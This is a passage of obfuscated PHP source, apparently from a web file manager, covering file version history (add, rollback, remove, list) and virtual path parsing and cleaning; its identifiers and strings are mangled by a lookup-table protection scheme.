($‘£•é´²[$ÄÔÀ¹[33]] == $ÄÔÀ¹[230]) { $¨¶îÅÜ¢ = self::listData($´ê©´ôÙ, !1); if ($¨¶îÅÜ¢ && $¨¶îÅÜ¢[$ÄÔÀ¹[445]]) { self::clear($´ê©´ôÙ, !1); } } else { IO::remove($‘£•é´²[$ÄÔÀ¹[87]]); self::clearEmptyFolder(IO::pathFather($‘£•é´²[$ÄÔÀ¹[87]])); } } private static function checkInHistory($¿óë¨Áå) { $èƒëÅ’« = self::pathHistory($¿óë¨Áå); if (!IO::exist($èƒëÅ’«)) { $èƒëÅ’« .= $_SERVER[¿ğÚ‰±–][1323]; } return IO::exist($èƒëÅ’«) ? IO::info($èƒëÅ’«) : !1; } private static function parsePath($âéÏô) { $ƒêæúˆ =& $_SERVER[¿ğÚ‰±–]; if (!$âéÏô) { return !1; } if (isset($GLOBALS[$ƒêæúˆ[1324]]) && $GLOBALS[$ƒêæúˆ[1324]]) { return; } $ÅÉŠ²Œã = KodIO::parse($âéÏô); $å†âÌ§Ğ = $ÅÉŠ²Œã[$ƒêæúˆ[33]]; $ü°¨Íˆ = !$å†âÌ§Ğ || $å†âÌ§Ğ == KodIO::KOD_IO || $å†âÌ§Ğ == KodIO::KOD_SHARE_ITEM; if (!$ü°¨Íˆ || !$ÅÉŠ²Œã[$ƒêæúˆ[1325]]) { return !1; } if (substr($âéÏô, 0, strlen(DATA_PATH . $ƒêæúˆ[1326])) == DATA_PATH . $ƒêæúˆ[1326]) { return !1; } if ($å†âÌ§Ğ == KodIO::KOD_SHARE_ITEM) { $µ¬©…×ø = IO::init($âéÏô); if ($µ¬©…×ø->pathParse[$ƒêæúˆ[1239]]) { return self::parsePath($µ¬©…×ø->pathParse[$ƒêæúˆ[1239]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ì‹ïÌÎâ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ƒêæúˆ[1327]); foreach ($Ì‹ïÌÎâ as $Á‰³°åà) { if (!$å†âÌ§Ğ && substr($âéÏô, 0, strlen($Á‰³°åà)) == $Á‰³°åà) { return !1; } } self::log($GLOBALS[$ƒêæúˆ[1234]] . $ƒêæúˆ[1328] . $âéÏô); return $âéÏô; } private static function pathHistory($“³á¹‘ó) { $Åêäİ€½ =& $_SERVER[¿ğÚ‰±–]; $ªî¿éı = self::$_historyBase . ltrim(KodIO::clear($“³á¹‘ó), $Åêäİ€½[8]); $ªî¿éı = str_replace(array($Åêäİ€½[1329]), array($Åêäİ€½[1330]), $ªî¿éı); return $ªî¿éı; } public static function log($ğëÉĞÖª) { } public static function historyCount($×ŞÃû¢) { $ƒÄÅ¡¬ì =& $_SERVER[¿ğÚ‰±–]; $Ğ‹´™åæ = array(); $şÜ½à´ = array(); foreach ($×ŞÃû¢ as $†Ü¶Ò) { $ÍŒò«ø = get_path_father($†Ü¶Ò); if (!$şÜ½à´[$ÍŒò«ø]) { $şÜ½à´[$ÍŒò«ø] = array(); } $şÜ½à´[$ÍŒò«ø][] = get_path_this($†Ü¶Ò); } foreach ($şÜ½à´ as $ÍŒò«ø => $ºÀ“Äµ®) { $³ÓÍ‰Ùæ = self::parsePath($ÍŒò«ø); if (!$³ÓÍ‰Ùæ) { continue; } foreach ($ºÀ“Äµ® as $ŠÎ”Â) { $âÇÛ³íØ = self::listData(rtrim($³ÓÍ‰Ùæ, $ƒÄÅ¡¬ì[8]) . $ƒÄÅ¡¬ì[8] . $ŠÎ”Â, !1); if ($âÇÛ³íØ && $âÇÛ³íØ[$ƒÄÅ¡¬ì[445]]) { $Ğ‹´™åæ[rtrim($ÍŒò«ø, $ƒÄÅ¡¬ì[8]) . $ƒÄÅ¡¬ì[8] . $ŠÎ”Â] = count($âÇÛ³íØ[$ƒÄÅ¡¬ì[445]]); } } } return $Ğ‹´™åæ; } public static function add($ß÷ºæ…ı) { $ó”š‘ÓÆ =& $_SERVER[¿ğÚ‰±–]; $ùÛ—Ş§± = self::listData($ß÷ºæ…ı); if (!$ùÛ—Ş§±) { return; } $ÄÒéÈòÎ = Model($ó”š‘ÓÆ[848])->get($ó”š‘ÓÆ[1331]); $Ù•‹Ÿ = intval($GLOBALS[$ó”š‘ÓÆ[6]][$ó”š‘ÓÆ[92]][$ó”š‘ÓÆ[1309]]); $ä§Êá‘ = $ÄÒéÈòÎ == $ó”š‘ÓÆ[1332] ? min(5, $Ù•‹Ÿ) : $Ù•‹Ÿ; if ($Ù•‹Ÿ <= 0) { return; } $é™Ó§ô¹ = IO::info($ß÷ºæ…ı); $³ú²­‡Î = $ùÛ—Ş§±[$ó”š‘ÓÆ[445]]; if ($é™Ó§ô¹[$ó”š‘ÓÆ[79]] == 0) { return; } if ($é™Ó§ô¹[$ó”š‘ÓÆ[79]] >= 1024 * 1024 * 500) { return !1; } $ñ—ßèİ = IO::hashSimple($ß÷ºæ…ı); if ($³ú²­‡Î && $³ú²­‡Î[0][$ó”š‘ÓÆ[672]] == $ñ—ßèİ) { return !0; } if (array_key_exists($ó”š‘ÓÆ[233], $é™Ó§ô¹) && !$é™Ó§ô¹[$ó”š‘ÓÆ[233]]) { return !1; } $œ®Ø™ÌĞ = short_id(time()); $İäãÊâ€ = array($ó”š‘ÓÆ[475] => $œ®Ø™ÌĞ, $ó”š‘ÓÆ[672] => $ñ—ßèİ, $ó”š‘ÓÆ[32] => $é™Ó§ô¹[$ó”š‘ÓÆ[32]] . $ó”š‘ÓÆ[10] . date($ó”š‘ÓÆ[1333]) . rand_string(1), $ó”š‘ÓÆ[79] => $é™Ó§ô¹[$ó”š‘ÓÆ[79]], $ó”š‘ÓÆ[527] => USER_ID, $ó”š‘ÓÆ[231] => time(), $ó”š‘ÓÆ[1334] => $ó”š‘ÓÆ[12]); IO::mkdir($ùÛ—Ş§±[$ó”š‘ÓÆ[1335]]); $ÍÖ³òÈş = IO::copy($ß÷ºæ…ı, $ùÛ—Ş§±[$ó”š‘ÓÆ[1335]], !1, $İäãÊâ€[$ó”š‘ÓÆ[32]]); if (!$ÍÖ³òÈş) { self::clearEmptyFolder($ùÛ—Ş§±[$ó”š‘ÓÆ[1335]]); return !1; } array_unshift($³ú²­‡Î, $İäãÊâ€); if (count($³ú²­‡Î) > $ä§Êá‘) { $¹õÓÓáî = array_slice($³ú²­‡Î, $ä§Êá‘); foreach ($¹õÓÓáî as $ô¶¥Ãİ) { IO::remove($ùÛ—Ş§±[$ó”š‘ÓÆ[1335]] . $ô¶¥Ãİ[$ó”š‘ÓÆ[32]]); } $³ú²­‡Î = array_slice($³ú²­‡Î, 0, $ä§Êá‘); } return self::saveData($ùÛ—Ş§±[$ó”š‘ÓÆ[1336]], $³ú²­‡Î); } public static function remove($®ÖŞØ†ª, $ê¦•‘½‹) { $±ğéì¹Ò =& $_SERVER[¿ğÚ‰±–]; $Ñı¬Š›Ë = self::listData($®ÖŞØ†ª); $®ÎÈ´Ù = array(); if (!$Ñı¬Š›Ë) { return !1; } foreach ($Ñı¬Š›Ë[$±ğéì¹Ò[445]] as $œå³¾½) { if ($œå³¾½[$±ğéì¹Ò[475]] == $ê¦•‘½‹) { IO::remove($Ñı¬Š›Ë[$±ğéì¹Ò[1335]] . $œå³¾½[$±ğéì¹Ò[32]]); continue; } $®ÎÈ´Ù[] = $œå³¾½; } return self::saveData($Ñı¬Š›Ë[$±ğéì¹Ò[1336]], $®ÎÈ´Ù); } public static function clear($ã²ÏÆ™, $“·Öºµì = true) { $À¤ÇË±û =& $_SERVER[¿ğÚ‰±–]; $‡ÉİŸ¶ = self::listData($ã²ÏÆ™, $“·Öºµì); if (!$‡ÉİŸ¶) { return !1; } foreach ($‡ÉİŸ¶[$À¤ÇË±û[445]] as $Ï§–£¨º) { IO::remove($‡ÉİŸ¶[$À¤ÇË±û[1335]] . $Ï§–£¨º[$À¤ÇË±û[32]]); } return self::saveData($‡ÉİŸ¶[$À¤ÇË±û[1336]], array()); } public static function moveHistory($ääí÷¶¦, $ÂÄéõÃÃ = '', $¥÷ë–—ç = '') { $´®÷­şû =& $_SERVER[¿ğÚ‰±–]; $ÌÉ’¾…Ã = self::listData($ääí÷¶¦, !1); if (!$ÌÉ’¾…Ã || !$ÌÉ’¾…Ã[$´®÷­şû[445]]) { return !1; } $¦Õ™å† = $´®÷­şû[1323]; $ÂÄéõÃÃ = $ÂÄéõÃÃ ? $ÂÄéõÃÃ : get_path_this($ääí÷¶¦); $¥÷ë–—ç = $¥÷ë–—ç ? $¥÷ë–—ç : $ÌÉ’¾…Ã[$´®÷­şû[1335]]; $„Ó‘±ÁÓ = substr(get_path_this($ÌÉ’¾…Ã[$´®÷­şû[1336]]), 0, -strlen($¦Õ™å†)); foreach ($ÌÉ’¾…Ã[$´®÷­şû[445]] as $ÑœÃÄ‚ => $Œã—ı‚é) { $Ş‡ã°› = $ÂÄéõÃÃ . substr($Œã—ı‚é[$´®÷­şû[32]], strlen($„Ó‘±ÁÓ)); $§Ú¾ó³ = IO::move($ÌÉ’¾…Ã[$´®÷­şû[1335]] . $Œã—ı‚é[$´®÷­şû[32]], $¥÷ë–—ç, !1, $Ş‡ã°›); if ($§Ú¾ó³) { $ÌÉ’¾…Ã[$´®÷­şû[445]][$ÑœÃÄ‚][$´®÷­şû[32]] = $Ş‡ã°›; } } $ÌÉ’¾…Ã[$´®÷­şû[1336]] = IO::move($ÌÉ’¾…Ã[$´®÷­şû[1336]], $¥÷ë–—ç, !1, $ÂÄéõÃÃ . $¦Õ™å†); self::saveData($ÌÉ’¾…Ã[$´®÷­şû[1336]], $ÌÉ’¾…Ã[$´®÷­şû[445]]); self::clearEmptyFolder($ÌÉ’¾…Ã[$´®÷­şû[1335]]); } public static function rollback($™ú‰çå, $£Ñ€©²) { $ÜĞÉ£¿Ğ =& $_SERVER[¿ğÚ‰±–]; $Œó›¹À = self::listData($™ú‰çå); if (!$Œó›¹À) { return; } $‘ºîîà  = IO::info($™ú‰çå); foreach ($Œó›¹À[$ÜĞÉ£¿Ğ[445]] as $ø®¼…Â‰ => $®¿•äñØ) { if ($®¿•äñØ[$ÜĞÉ£¿Ğ[475]] == $£Ñ€©²) { self::add($™ú‰çå); $ÊÀÛüá = $Œó›¹À[$ÜĞÉ£¿Ğ[1335]] . $®¿•äñØ[$ÜĞÉ£¿Ğ[32]]; $ªÂß•°ü = IO::copy($ÊÀÛüá, IO::pathFather($™ú‰çå), REPEAT_REPLACE, $‘ºîîà [$ÜĞÉ£¿Ğ[32]]); if ($ªÂß•°ü) { self::remove($™ú‰çå, $£Ñ€©²); } return $ªÂß•°ü; } } return !1; } public static function setDetail($ĞÜ¨âîó, $«ƒ­˜öÍ, $€Ÿş‚ì¯) { $áÌ¹øŸí =& $_SERVER[¿ğÚ‰±–]; $²è±ï…‘ = self::listData($ĞÜ¨âîó); if (!$²è±ï…‘) { return; } foreach ($²è±ï…‘[$áÌ¹øŸí[445]] as $×üó„³ => $² ôÃÔ£) { if ($² ôÃÔ£[$áÌ¹øŸí[475]] == $«ƒ­˜öÍ) { $²è±ï…‘[$áÌ¹øŸí[445]][$×üó„³][$áÌ¹øŸí[1334]] = $€Ÿş‚ì¯; self::saveData($²è±ï…‘[$áÌ¹øŸí[1336]], $²è±ï…‘[$áÌ¹øŸí[445]]); return !0; } } return !1; } public static function fileInfo($š»³ áø, $ÇˆŞªÙü) { $ù¬ªõÔà =& $_SERVER[¿ğÚ‰±–]; $Î¿çÖ¯Õ = self::listData($š»³ áø); if (!$Î¿çÖ¯Õ) { show_json(LNG($ù¬ªõÔà[108]), !1); } $¬Àõ†Õ = $ù¬ªõÔà[12]; foreach ($Î¿çÖ¯Õ[$ù¬ªõÔà[445]] as $ÊßÎëÙî => $şï¹ìœ½) { if ($şï¹ìœ½[$ù¬ªõÔà[475]] != $ÇˆŞªÙü) { continue; } $¬Àõ†Õ = $Î¿çÖ¯Õ[$ù¬ªõÔà[1335]] . $şï¹ìœ½[$ù¬ªõÔà[32]]; break; } if (!$¬Àõ†Õ) { show_json(LNG($ù¬ªõÔà[108]), !1); } return IO::info($¬Àõ†Õ); } public static function fileOut($èÙÉÎµ², $ãıèøñ, $í“€¬¡† = false) { $Ûã•ò±Ğ =& $_SERVER[¿ğÚ‰±–]; $Í¶ö¶Ì = self::fileInfo($èÙÉÎµ², $ãıèøñ); $Ÿ¯­£ëÚ =& $GLOBALS[$Ûã•ò±Ğ[7]]; $í“€¬¡† = isset($Ÿ¯­£ëÚ[$Ûã•ò±Ğ[1286]]) && $Ÿ¯­£ëÚ[$Ûã•ò±Ğ[1286]] == 1; if (isset($Ÿ¯­£ëÚ[$Ûã•ò±Ğ[33]]) && $Ÿ¯­£ëÚ[$Ûã•ò±Ğ[33]] == $Ûã•ò±Ğ[1337]) { return IO::fileOutImage($Í¶ö¶Ì[$Ûã•ò±Ğ[87]], $Ÿ¯­£ëÚ[$Ûã•ò±Ğ[1338]]); } IO::fileOut($Í¶ö¶Ì[$Ûã•ò±Ğ[87]], $í“€¬¡†, get_path_this($èÙÉÎµ²)); } public static function listData($©ÖèŞÍï, $‹ğ·Ç‡ú = true) { $—°­«…¾ =& $_SERVER[¿ğÚ‰±–]; if ($‹ğ·Ç‡ú && !IO::exist($©ÖèŞÍï)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($©ÖèŞÍï, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $µşöä­ = self::pathHistory($©ÖèŞÍï); $æ–¬§äƒ = array($—°­«…¾[1336] => $µşöä­ . $—°­«…¾[1323], $—°­«…¾[1335] => rtrim(get_path_father($µşöä­), $—°­«…¾[8]) . $—°­«…¾[8], $—°­«…¾[445] => array()); $Œ“†öôî = IO::getContent($æ–¬§äƒ[$—°­«…¾[1336]]); if ($Œ“†öôî) { $‚ÅäÃ¹³ = json_decode($Œ“†öôî, !0); if (is_array($‚ÅäÃ¹³)) { $æ–¬§äƒ[$—°­«…¾[445]] = $‚ÅäÃ¹³; } } return $æ–¬§äƒ; } private static function saveData($µ–¬şŸ, $ç¢¦”©’) { $¡‚ß‘¬ö =& $_SERVER[¿ğÚ‰±–]; self::log($¡‚ß‘¬ö[1339] . $µ–¬şŸ . $¡‚ß‘¬ö[74] . count($ç¢¦”©’), $¡‚ß‘¬ö[830]); if ($ç¢¦”©’) { return IO::setContent($µ–¬şŸ, json_encode($ç¢¦”©’)); } $†»ÑËÄÏ = IO::pathFather($µ–¬şŸ); IO::remove($µ–¬şŸ); self::clearEmptyFolder($†»ÑËÄÏ); return !0; } public static function clearEmptyFolder($ã¯°•½) { $¶•³ë„Ä =& $_SERVER[¿ğÚ‰±–]; if (trim($ã¯°•½, $¶•³ë„Ä[8]) == trim(self::$_historyBase, $¶•³ë„Ä[8])) { return; } $ïÔ—ø¢¸ = IO::pathFather($ã¯°•½); $ÆÄü¬ø = IO::has($ã¯°•½, !0); if ($ÆÄü¬ø[$¶•³ë„Ä[239]] > 0 || $ÆÄü¬ø[$¶•³ë„Ä[240]] > 0) { return; } IO::remove($ã¯°•½); self::clearEmptyFolder($ïÔ—ø¢¸); } private static function getBasePath() { $”«‘˜ªÂ =& $_SERVER[¿ğÚ‰±–]; $™ù‹‘ñ– = Model($”«‘˜ªÂ[1340])->get($”«‘˜ªÂ[1341]); if ($™ù‹‘ñ–) { if (!IO::exist($™ù‹‘ñ–)) { IO::mkdir($™ù‹‘ñ–); } if (get_path_this($™ù‹‘ñ–) == $”«‘˜ªÂ[1326]) { $¼äÃ‹ğ = $”«‘˜ªÂ[1342] . rand_string(8); @rename($™ù‹‘ñ–, get_path_father($™ù‹‘ñ–) . $”«‘˜ªÂ[8] . $¼äÃ‹ğ); $™ù‹‘ñ– = DATA_PATH . $¼äÃ‹ğ . $”«‘˜ªÂ[8]; file_put_contents(DATA_PATH . $”«‘˜ªÂ[1273], $”«‘˜ªÂ[12]); Model($”«‘˜ªÂ[1340])->set($”«‘˜ªÂ[1341], $™ù‹‘ñ–); } return $™ù‹‘ñ–; } $™ù‹‘ñ– = DATA_PATH . $”«‘˜ªÂ[1342] . rand_string(8) . $”«‘˜ªÂ[8]; $™ù‹‘ñ– = IO::mkdir($™ù‹‘ñ–); $™ù‹‘ñ– = rtrim($™ù‹‘ñ–, $”«‘˜ªÂ[8]) . $”«‘˜ªÂ[8]; file_put_contents($™ù‹‘ñ– . $”«‘˜ªÂ[1273], $”«‘˜ªÂ[12]); file_put_contents(DATA_PATH . $”«‘˜ªÂ[1273], $”«‘˜ªÂ[12]); Model($”«‘˜ªÂ[1340])->set($”«‘˜ªÂ[1341], $™ù‹‘ñ–); return $™ù‹‘ñ–; } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\x72\122\x65\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\x7b\165\x73\x65\x72\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\173\165\163\x65\162\106\151\154\145\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\162\106\x69\x6c\145\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\160\122\157\157\164\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\x53\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\162\x53\150\141\x72\145\x4c\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\162\145\124\157\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\x72\145\111\164\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\x72\x65\111\164\145\155\x4c\x69\156\153\175"; const KOD_SEARCH = "\x7b\x73\145\141\162\x63\150\175"; const KOD_BLOCK = "\173\x62\x6c\x6f\143\x6b\175"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\173\x75\x73\x65\162\x52\x65\x6e\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\162\x69\x76\145\x72\x7d"; public static function typeList() { $”àæˆæŸ =& $_SERVER[¿ğÚ‰±–]; return array($”àæˆæŸ[1343] => self::KOD_SOURCE, $”àæˆæŸ[1344] => self::KOD_USER_RECYCLE, $”àæˆæŸ[1345] => self::KOD_USER_FAV, $”àæˆæŸ[1346] => self::KOD_USER_FILE_TAG, $”àæˆæŸ[1347] => self::KOD_USER_FILE_TYPE, $”àæˆæŸ[1348] => self::KOD_GROUP_ROOT_SELF, $”àæˆæŸ[1349] => self::KOD_USER_SHARE, $”àæˆæŸ[1350] => self::KOD_USER_SHARE_LINK, $”àæˆæŸ[1351] => self::KOD_USER_SHARE_TO_ME, $”àæˆæŸ[1352] => self::KOD_SHARE_ITEM, $”àæˆæŸ[1353] => self::KOD_SHARE_LINK, $”àæˆæŸ[1354] => self::KOD_SEARCH, $”àæˆæŸ[1355] => self::KOD_BLOCK, $”àæˆæŸ[1356] => self::KOD_IO, $”àæˆæŸ[1357] => self::KOD_USER_RECENT, $”àæˆæŸ[1358] => self::KOD_USER_DRIVER); } public static function parse($×¾ªÏ¶«) { $ş¾‹»Ûş =& $_SERVER[¿ğÚ‰±–]; $×¾ªÏ¶« = self::clear($×¾ªÏ¶«); $ö»²„‹ = array_values(self::typeList()); preg_match($ş¾‹»Ûş[1359], $×¾ªÏ¶«, $ÄÏ«Õ«¨); $Ã‡™ñ = array($ş¾‹»Ûş[496] => !1, $ş¾‹»Ûş[1360] => !1, $ş¾‹»Ûş[493] => !1, $ş¾‹»Ûş[87] => $×¾ªÏ¶«, $ş¾‹»Ûş[1258] => !1, $ş¾‹»Ûş[1257] => $ş¾‹»Ûş[12]); if (is_array($ÄÏ«Õ«¨) && count($ÄÏ«Õ«¨) == 5) { $œôÏ”è  = $ş¾‹»Ûş[1361] . $ÄÏ«Õ«¨[2] . $ş¾‹»Ûş[403]; if (in_array($œôÏ”è , $ö»²„‹)) { $Ã‡™ñ[$ş¾‹»Ûş[1258]] = $ÄÏ«Õ«¨[1]; $Ã‡™ñ[$ş¾‹»Ûş[33]] = $œôÏ”è ; $Ã‡™ñ[$ş¾‹»Ûş[1362]] = substr($œôÏ”è , 1, -1); $Ã‡™ñ[$ş¾‹»Ûş[475]] = $ÄÏ«Õ«¨[3]; } $Ã‡™ñ[$ş¾‹»Ûş[1257]] = $ÄÏ«Õ«¨[4]; } $†ÌŞÚÈ¹ = array($ş¾‹»Ûş[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ã‡™ñ[$ş¾‹»Ûş[1325]] = in_array($Ã‡™ñ[$ş¾‹»Ûş[33]], $†ÌŞÚÈ¹); return $Ã‡™ñ; } public static function isTruePath($ì¾¦Àà·) { $’ı¥¤ÌÂ =& $_SERVER[¿ğÚ‰±–]; if (substr($ì¾¦Àà·, 0, 1) != $’ı¥¤ÌÂ[1361]) { return !0; } if (strpos($ì¾¦Àà·, $’ı¥¤ÌÂ[483]) === 0) { return !0; } if (strpos($ì¾¦Àà·, $’ı¥¤ÌÂ[1329]) === 0) { return !0; } if (strpos($ì¾¦Àà·, $’ı¥¤ÌÂ[1363]) === 0) { return !0; } if (strpos($ì¾¦Àà·, $’ı¥¤ÌÂ[1364]) === 0) { return !0; } if (strpos($ì¾¦Àà·, $’ı¥¤ÌÂ[1365]) === 0) { return !0; } return !1; } public static function clear($Å‡éÙÃÖ) { $Ö÷Ïüµù =& $_SERVER[¿ğÚ‰±–]; $Å‡éÙÃÖ = str_replace(array($Ö÷Ïüµù[1164], $Ö÷Ïüµù[262]), $Ö÷Ïüµù[53], $Å‡éÙÃÖ); $Å‡éÙÃÖ = str_replace($Ö÷Ïüµù[100], $Ö÷Ïüµù[8], $Å‡éÙÃÖ); $ò€Ó× = $Ö÷Ïüµù[1366]; if (substr($Å‡éÙÃÖ, 0, 3) == $Ö÷Ïüµù[1367]) { $Å‡éÙÃÖ = substr($Å‡éÙÃÖ, 3); } while (strstr($Å‡éÙÃÖ, $ò€Ó×)) { $Å‡éÙÃÖ = str_replace($ò€Ó×, $Ö÷Ïüµù[8], $Å‡éÙÃÖ); } $Å‡éÙÃÖ = preg_replace($Ö÷Ïüµù[1368], $Ö÷Ïüµù[8], $Å‡éÙÃÖ); if ($Å‡éÙÃÖ == $Ö÷Ïüµù[8]) { return $Ö÷Ïüµù[8]; } $Å‡éÙÃÖ = rtrim($Å‡éÙÃÖ, $Ö÷Ïüµù[8]); return $Å‡éÙÃÖ; } public static function pathTrue($®ë¥â·‚) { $ú™€–Ã­ =& $_SERVER[¿ğÚ‰±–]; if (!$®ë¥â·‚) { return $ú™€–Ã­[12]; } $®ë¥â·‚ = str_replace($ú™€–Ã­[592], $ú™€–Ã­[8], str_replace($ú™€–Ã­[1369], $ú™€–Ã­[8], $®ë¥â·‚)); $®ë¥â·‚ = str_replace($ú™€–Ã­[592], $ú™€–Ã­[8], str_replace($ú™€–Ã­[1369], $ú™€–Ã­[8], $®ë¥â·‚)); if (!strstr($®ë¥â·‚, $ú™€–Ã­[1367])) { return $®ë¥â·‚; } $Ì³Ü½À‘ = explode($ú™€–Ã­[8], $®ë¥â·‚); foreach ($Ì³Ü½À‘ as $È§ËÅïÂ => $ˆÒ¹å¥) { if ($ˆÒ¹å¥ !== $ú™€–Ã­[1370]) { continue; } for ($Ö«æ‚ò„ = $È§ËÅïÂ; $Ö«æ‚ò„ >= 0; $Ö«æ‚ò„--) { if ($Ì³Ü½À‘[$Ö«æ‚ò„] === $ú™€–Ã­[10] || $Ì³Ü½À‘[$Ö«æ‚ò„] === $ú™€–Ã­[1370] || $Ì³Ü½À‘[$Ö«æ‚ò„] === -1) { continue; } if ($Ì³Ü½À‘[$Ö«æ‚ò„] === $ú™€–Ã­[12]) { $Ì³Ü½À‘[$È§ËÅïÂ] = -1; break; } $Ì³Ü½À‘[$È§ËÅïÂ] = -1; $Ì³Ü½À‘[$Ö«æ‚ò„] = -1; break; } } $±Ç‹ğ  = array(); foreach ($Ì³Ü½À‘ as $ˆÒ¹å¥) { if ($ˆÒ¹å¥ !== -1) { $±Ç‹ğ [] = $ˆÒ¹å¥; } } $«ìÍÄµÑ = implode($ú™€–Ã­[8], $±Ç‹ğ ); if (strpos($«ìÍÄµÑ, $ú™€–Ã­[1371]) === 0) { $«ìÍÄµÑ = $ú™€–Ã­[1367] . substr($«ìÍÄµÑ, strlen($ú™€–Ã­[1371])); } return $«ìÍÄµÑ; } public static function pathUrlClear($îåÌ‰ıÙ) { $¼¦ì¹Ô =& $_SERVER[¿ğÚ‰±–]; if (!$îåÌ‰ıÙ) { return $îåÌ‰ıÙ; } $îåÌ‰ıÙ = rawurldecode($îåÌ‰ıÙ); $îåÌ‰ıÙ = str_replace($¼¦ì¹Ô[1369], $¼¦ì¹Ô[8], $îåÌ‰ıÙ); if (strpos($îåÌ‰ıÙ, $¼¦ì¹Ô[76]) > 0) { $îåÌ‰ıÙ = substr($îåÌ‰ıÙ, 0, strpos($îåÌ‰ıÙ, $¼¦ì¹Ô[76])); } if (strpos($îåÌ‰ıÙ, $¼¦ì¹Ô[1372]) > 0) { $îåÌ‰ıÙ = substr($îåÌ‰ıÙ, 0, strpos($îåÌ‰ıÙ, $¼¦ì¹Ô[1372])); } return $îåÌ‰ıÙ; } public static function sourceID($æ—¥ÑÙ¤) { $”Åşª¾ˆ =& $_SERVER[¿ğÚ‰±–]; $‘ŸÔÛà = self::parse($æ—¥ÑÙ¤); if ($‘ŸÔÛà[$”Åşª¾ˆ[33]] !== self::KOD_SOURCE) { show_json(LNG($”Åşª¾ˆ[1373]), !1); } return $‘ŸÔÛà[$”Åşª¾ˆ[475]]; } public static function make($‚®ØÈ×§) { if (!$‚®ØÈ×§) { return !1; } return self::makePath(self::KOD_SOURCE, intval($‚®ØÈ×§)); } public static function makeShare($ôü»¤¦¦, $Æ˜Ÿ°) { return self::makePath(self::KOD_SHARE_ITEM, $ôü»¤¦¦, $Æ˜Ÿ°); } public static function makeFileTypePath($ú¿Î¥µó) { return self::makePath(self::KOD_USER_FILE_TYPE, $ú¿Î¥µó); } public static function makeFileTagPath($ş„¼óÓ£) { return self::makePath(self::KOD_USER_FILE_TAG, $ş„¼óÓ£); } public static function makePath($äµß©™, $ŒØùÒ› = '', $ÌÖŠ¡¿í = '') { $‚Êº–ş =& $_SERVER[¿ğÚ‰±–]; $æ¯¯¼¸ = substr($äµß©™, 1, -1); $ˆŞĞ»‡ = $‚Êº–ş[1374] . $æ¯¯¼¸ . $‚Êº–ş[1375] . $ŒØùÒ› . $‚Êº–ş[1376]; $ˆŞĞ»‡ = $ÌÖŠ¡¿í ? $ˆŞĞ»‡ . $ÌÖŠ¡¿í . $‚Êº–ş[8] : $ˆŞĞ»‡; return $ˆŞĞ»‡; } public static function hashPath($œßšÖöº, $şÔ¨„š = true) { $Ç÷¥‹âœ =& $_SERVER[¿ğÚ‰±–]; $öğ¤½ÛŒ = is_array($œßšÖöº) ? $œßšÖöº : IO::info($œßšÖöº); $×ú‰¢¬® = _get($öğ¤½ÛŒ, $Ç÷¥‹âœ[1377], $Ç÷¥‹âœ[12]); if (!$×ú‰¢¬® && isset($öğ¤½ÛŒ[$Ç÷¥‹âœ[235]])) { $×ú‰¢¬® = trim($öğ¤½ÛŒ[$Ç÷¥‹âœ[235]], $Ç÷¥‹âœ[121]); } if (!$×ú‰¢¬® && isset($öğ¤½ÛŒ[$Ç÷¥‹âœ[193]]) && $öğ¤½ÛŒ[$Ç÷¥‹âœ[193]]) { $öğ¤½ÛŒ = IO::info(KodIO::make($öğ¤½ÛŒ[$Ç÷¥‹âœ[193]])); $×ú‰¢¬® = _get($öğ¤½ÛŒ, $Ç÷¥‹âœ[1377], $Ç÷¥‹âœ[12]); } $³ßğî¢ò = md5($öğ¤½ÛŒ[$Ç÷¥‹âœ[87]] . $öğ¤½ÛŒ[$Ç÷¥‹âœ[79]] . $öğ¤½ÛŒ[$Ç÷¥‹âœ[88]]); if (!$×ú‰¢¬® && file_exists($öğ¤½ÛŒ[$Ç÷¥‹âœ[87]])) { $×ú‰¢¬® = Cache::get($³ßğî¢ò . $Ç÷¥‹âœ[1378]); $×ú‰¢¬® = !1; if (!$×ú‰¢¬®) { $×ú‰¢¬® = IO::hashSimple($öğ¤½ÛŒ[$Ç÷¥‹âœ[87]]); Cache::set($³ßğî¢ò . $Ç÷¥‹âœ[1378], $×ú‰¢¬®, 3600 * 24 * 30); } } if ($şÔ¨„š && !$×ú‰¢¬®) { } return $×ú‰¢¬® ? $×ú‰¢¬® : $³ßğî¢ò; } public static function hashPathSafe($ìÉÂÕŒ, $¾ËËµÕ¬ = true) { $üÏş¹Ş· =& $_SERVER[¿ğÚ‰±–]; $¯È¸­»• = self::hashPath($ìÉÂÕŒ, $¾ËËµÕ¬); return md5($¯È¸­»• . $üÏş¹Ş·[1379] . Model($üÏş¹Ş·[848])->get($üÏş¹Ş·[849])); } public static function initSystemPath() { $¦Ç¾§™ =& $_SERVER[¿ğÚ‰±–]; if (defined($¦Ç¾§™[1380])) { return; } define($¦Ç¾§™[1380], self::systemPath($¦Ç¾§™[191])); define($¦Ç¾§™[1381], self::systemPath($¦Ç¾§™[1382])); define($¦Ç¾§™[1383], self::systemPath($¦Ç¾§™[1384])); define($¦Ç¾§™[1385], self::systemPath($¦Ç¾§™[1386])); IOHistory::bindEvent(); } public static function systemPath($æßê°×) { $À˜àœÛƒ =& $_SERVER[¿ğÚ‰±–]; $³ï§˜è© = $À˜àœÛƒ[1387] . ucfirst($æßê°×); $»“¢é® = 